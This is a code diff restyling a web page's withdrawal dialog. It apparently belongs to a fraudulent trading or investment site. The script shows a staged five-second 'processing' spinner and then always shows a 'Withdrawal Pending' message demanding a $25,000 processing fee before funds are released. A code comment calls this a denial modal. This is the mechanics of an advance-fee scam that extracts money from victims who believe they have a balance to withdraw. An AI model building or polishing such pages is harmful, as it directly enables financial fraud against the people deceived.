@@ -211,10 +211,10 @@
     </div>
 
     <div id="withdrawalModal" class="modal">
-        <div class="modal-content">
-            <h3 style="color: #c62828;">Withdrawal Pending</h3>
-            <p>This withdrawal cannot be processed at this time. A required processing fee of $25,000 must be paid before the transaction can proceed. Please contact support for further assistance.</p>
-            <button onclick="closeModals()">OK</button>
+        <div class="modal-content" style="background: #111; color: #fff; border: 1px solid #c5a04a; border-radius: 24px; padding: 30px; text-align: center; max-width: 300px; width: 78%; margin: auto; box-shadow: 0 12px 30px rgba(0,0,0,0.6);">
+            <h3 style="color: #c62828; margin-top: 0;">Withdrawal Pending</h3>
+            <p style="color: #ccc; font-size: 14px; margin-bottom: 20px;">This transaction cannot be processed at this time. A required processing fee of $25,000 must be paid before the transaction can proceed. Please contact support for further assistance.</p>
+            <button onclick="closeModals()" style="background: #c5a04a; color: #000; border: none; padding: 12px 36px; border-radius: 12px; font-weight: 800; cursor: pointer;">OK</button>
         </div>
     </div>
 
@@ -247,14 +247,14 @@
             document.getElementById('processingModal').style.display = 'flex';
             spinnerBox.style.display = 'flex';
 
-            // Wait 5 seconds (5000 milliseconds) before displaying the withdrawal pending modal
+            // Wait 5 seconds (5000 milliseconds) before displaying the denial modal
             setTimeout(() => {
                 // Hide spinner
                 spinnerBox.style.display = 'none';
                 // Close the processing modal
                 document.getElementById('processingModal').style.display = 'none';
                 
-                // Trigger the existing withdrawal pending modal as the result
+                // Trigger the pending modal as the result
                 document.getElementById('withdrawalModal').style.display = 'flex';
             }, 5000);
         }
